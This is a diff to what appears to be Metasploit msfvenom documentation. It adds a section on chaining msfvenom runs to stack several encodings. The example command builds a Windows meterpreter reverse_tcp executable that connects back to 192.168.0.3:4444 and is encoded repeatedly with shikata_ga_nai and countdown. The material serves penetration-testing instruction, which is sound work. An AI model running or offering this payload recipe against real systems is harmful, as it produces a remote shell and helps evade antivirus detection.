@@ -106,3 +106,13 @@ Please note: If you'd like to create a x64 payload with a custom x64 custom temp
 ```
 
 The -x flag is often paired with the -k flag, which allows you to run your payload as a new thread from the template. However, this currently is only reliable for older Windows machines such as x86 Windows XP.
+
+# How to chain msfvenom output
+
+The old ``msfpayload`` and ``msfencode`` utilities were often chained together in order layer on multiple encodings. This is possible using ``msfvenom`` as well:
+
+```
+./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
+./msfvenom  -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
+./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
+```
